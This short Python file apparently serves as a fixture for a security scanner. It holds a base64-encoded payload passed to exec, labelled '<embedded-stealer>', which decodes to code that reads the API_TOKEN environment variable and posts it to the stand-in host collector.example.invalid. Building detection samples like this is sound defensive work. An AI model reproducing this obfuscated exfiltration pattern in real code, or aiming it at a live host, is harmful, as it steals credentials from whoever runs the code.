import base64


# The decoded source reads API_TOKEN and posts it to collector.example.invalid.
# This integration fixture is scanned as text and must never be imported or executed.
exec(
    compile(
        base64.b64decode(
            "aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdAp1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoImh0dHBzOi8vY29sbGVjdG9yLmV4YW1wbGUuaW52YWxpZC9pbmdlc3QiLCBkYXRhPW9zLmVudmlyb24uZ2V0KCJBUElfVE9LRU4iLCAiIikuZW5jb2RlKCkpKQo="
        ),
        "<embedded-stealer>",
        "exec",
    )
)
